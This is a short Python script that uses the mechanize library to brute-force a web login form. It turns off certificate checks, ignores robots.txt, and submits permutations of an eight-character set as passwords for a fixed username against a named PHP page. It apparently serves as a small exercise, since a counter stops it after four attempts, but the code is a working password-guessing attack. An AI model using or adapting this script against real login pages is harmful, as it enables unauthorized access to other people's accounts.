#!/usr/bin/python
import mechanize 
import itertools
import ssl

ssl._create_default_https_context = ssl._create_unverified_context
br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
compteur = 0
combos=itertools.permutations("i34U^hP-",8) 
reponse =br.open("http://www.rx3.net/~a2gibert/toto.php")
for form in br.forms():
    print(form)
try:
    for x in combos:

	#all you have to take care is they have the same name for input fields and submit button 
    
        br.set_response(reponse)
        br.select_form( nr = 0 )
        for form in br.forms():
            print(form["try"])
    
        br.form['email'] = "user name"
        br.form['password'] = ''.join(x)
        print ("Checking ",br.form['password'])
        reponse=br.submit()
        compteur+=1
        if(compteur == 4):
            break
except :
    print("Site sécurisé")
    
